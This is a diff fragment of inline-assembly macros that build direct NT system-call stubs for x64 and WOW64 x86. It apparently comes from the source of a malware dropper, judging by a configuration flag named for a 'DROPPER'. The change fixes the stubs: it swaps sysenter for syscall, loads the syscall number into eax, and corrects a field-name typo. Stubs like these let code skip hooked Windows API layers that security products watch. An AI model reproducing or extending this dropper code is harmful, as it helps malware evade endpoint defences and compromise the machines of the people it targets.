@@ -29,27 +29,28 @@ enum {
             L1:                                                                           \
                 __asm { mov r10,rcx                                                    }; \
                 __asm { mov rax, qword ptr NtapiSyscallsAddressStorage[PROCINDEX << 3] }; \
-                __asm { sysenter                                                       }; \
+                __asm { syscall                                                        }; \
                 __asm { ret                                                            }; \
             }
     #else
         #if SCFG_DROPPER_NTAPI_STUB_X86_USE_WOW64 == ON
-            #define NTAPI_STUB_SOURCE(PROCINDEX, X86_ARGSIZE)                            \
-                {                                                                        \
-                    __asm { cmp dword ptr [Config.NtVersion.bIsDeprecated], TRUE      }; \
-                    __asm { jne L1                                                    }; \
-                    __asm { jmp dword ptr NtapiSyscallsAddressStorage[PROCINDEX << 2] }; \
-                L1:                                                                      \
-                    __asm { cmp dword ptr [Config.NtVersiondwCommonIndex], 0          }; \
-                    __asm { je L2                                                     }; \
-                    __asm { call dword ptr fs:[Teb32Wow64ReservedOffset]              }; \
-                    __asm { ret X86_ARGSIZE                                           }; \
-                L2:                                                                      \
-                    __asm { xor ecx, ecx                                              }; \
-                    __asm { lea edx, [esp + 4]                                        }; \
-                    __asm { call dword ptr fs:[Teb32Wow64ReservedOffset]              }; \
-                    __asm { add esp, 4                                                }; \
-                    __asm { ret X86_ARGSIZE                                           }; \
+            #define NTAPI_STUB_SOURCE(PROCINDEX, X86_ARGSIZE)                                 \
+                {                                                                             \
+                    __asm { cmp dword ptr [Config.NtVersion.bIsDeprecated], TRUE           }; \
+                    __asm { jne L1                                                         }; \
+                    __asm { jmp dword ptr NtapiSyscallsAddressStorage[PROCINDEX << 2]      }; \
+                L1:                                                                           \
+                    __asm { mov eax, dword ptr NtapiSyscallsAddressStorage[PROCINDEX << 2] }; \
+                    __asm { cmp dword ptr [Config.NtVersion.dwCommonIndex], 0              }; \
+                    __asm { je L2                                                          }; \
+                    __asm { call dword ptr fs:[Teb32Wow64ReservedOffset]                   }; \
+                    __asm { ret X86_ARGSIZE                                                }; \
+                L2:                                                                           \
+                    __asm { xor ecx, ecx                                                   }; \
+                    __asm { lea edx, [esp + 4]                                             }; \
+                    __asm { call dword ptr fs:[Teb32Wow64ReservedOffset]                   }; \
+                    __asm { add esp, 4                                                     }; \
+                    __asm { ret X86_ARGSIZE                                                }; \
                 }
         #else
             #define NTAPI_STUB_SOURCE(PROCINDEX, X86_ARGSIZE)                                 \
